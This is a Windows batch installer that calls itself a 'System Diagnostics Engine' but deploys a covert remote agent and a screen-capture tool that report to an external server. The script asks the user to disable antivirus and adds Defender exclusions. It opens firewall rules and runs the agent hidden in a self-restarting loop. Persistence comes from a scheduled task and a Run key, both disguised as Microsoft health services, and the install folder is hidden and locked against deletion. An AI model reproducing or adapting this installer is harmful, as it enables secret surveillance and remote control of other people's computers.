@echo off
title System Diagnostics Engine
color 0A

:: =========================================================
:: ULTIMATE SETUP v7.0 — Based on the PROVEN working script
:: Uses the service.vbs + wscript.exe pattern that worked
:: on 200+ machines with localhost. Now adapted for production.
:: =========================================================

:: 1. Force Administrator Elevation (VBS method — works with spaces in paths)
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo.
    echo [!] Requesting Administrator Access...
    echo.
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

echo.
echo =========================================================
echo    SYSTEM DIAGNOSTICS ENGINE - DEPLOYMENT v7.0
echo =========================================================
echo.
echo    PLEASE DISABLE YOUR ANTIVIRUS before continuing.
echo    (Windows Defender / McAfee / Avast / etc.)
echo.
echo    Press any key when ready...
pause >nul
echo.

:: 2. Core Configurations
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL=https://h-boss-production.up.railway.app"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"

echo [1/8] Removing File Blocks (Mark of the Web)...
:: Unblock all files in background so it never hangs
start "" /B cmd /c "for /R "%~dp0" %%f in (*) do echo. >nul" >nul 2>&1
:: Also try native unblock if available
if exist "%~dp0*.exe" (
    for %%f in ("%~dp0*.exe") do (
        echo.>"%%f:Zone.Identifier" 2>nul
        del /F "%%f:Zone.Identifier" 2>nul
    )
)
echo     Done.

echo [2/8] Preparing Environment...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1

:: Unlock destination folder first if it exists from a previous install
if exist "%INSTALL_DIR%" (
    attrib -h -s -r "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo     Done.

echo [3/8] Copying Core Files to Vault...
xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1
if %errorlevel% neq 0 (
    robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
)

:: Try to compile ScreenCap for this machine, but KEEP bundled one if compile fails
set "CSC_PATH="
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not defined CSC_PATH if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
if defined CSC_PATH (
    if exist "%INSTALL_DIR%\ScreenCap.cs" (
        "%CSC_PATH%" /nologo /target:winexe /out:"%INSTALL_DIR%\ScreenCap.exe" /r:System.Windows.Forms.dll,System.Drawing.dll "%INSTALL_DIR%\ScreenCap.cs" >nul 2>&1
    )
)

:: Set up the proper executable
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
) else if exist "%~dp0node.exe" (
    copy /Y "%~dp0node.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
) else (
    echo [ERROR] teram_agent.exe not found! Make sure it is in this folder.
    pause
    exit /B
)
echo     Done.

echo [4/8] Configuring Firewall...
:: Defender exclusions in BACKGROUND (never hangs)
start "" /B cmd /c "powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -EA 0; Add-MpPreference -ExclusionProcess '%BIN_NAME%' -EA 0; Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -EA 0" >nul 2>&1"
:: Firewall rules (native, instant)
netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
echo     Done.

echo [5/8] Generating Silent Execution Service...
:: The PROVEN service.vbs pattern: runs exe hidden, auto-restarts if it crashes
(
 echo Set W = CreateObject^("WScript.Shell"^)
 echo W.CurrentDirectory = "%INSTALL_DIR%"
 echo Do
 echo   W.Run chr^(34^) ^& "%INSTALL_DIR%\%BIN_NAME%" ^& chr^(34^) ^& " index.js %SERVER_URL%", 0, True
 echo   WScript.Sleep 5000
 echo Loop
) > "%INSTALL_DIR%\service.vbs"
echo     Done.

echo [6/8] Registering Persistence...
:: Scheduled task runs the VBS wrapper (proven approach)
schtasks /Create /TN "%TASK_NAME%" /TR "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
:: Registry backup persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul
echo     Done.

echo [7/8] Engaging Stealth Protocols...
:: Hide the entire installation directory
attrib +h +s "%INSTALL_DIR%" /D
attrib +h +s "%INSTALL_DIR%\%BIN_NAME%"
attrib +h +s "%INSTALL_DIR%\service.vbs"
:: Lock the folder — only deny DELETE, not deny ALL
icacls "%INSTALL_DIR%" /deny Everyone:(DE,WDAC) /T /C /Q >nul 2>&1
echo     Done.

echo [8/8] Starting Service...
start "" wscript.exe "%INSTALL_DIR%\service.vbs"

:: Wait a moment for process to start
ping 127.0.0.1 -n 4 >nul

:: Check if running
tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 (
    echo.
    echo ===================================================
    echo    DEPLOYMENT SUCCESSFUL
    echo ===================================================
    echo    Agent is running silently.
    echo    Server: %SERVER_URL%
    echo    It will auto-restart on reboot.
    echo ===================================================
) else (
    echo.
    echo ===================================================
    echo    INSTALLED - Will start on next reboot
    echo ===================================================
    echo    If antivirus blocked it, add this to exclusions:
    echo    %INSTALL_DIR%
    echo    Then reboot or run:
    echo    wscript.exe "%INSTALL_DIR%\service.vbs"
    echo ===================================================
)

echo.
echo    Press any key to close...
pause >nul
exit /B
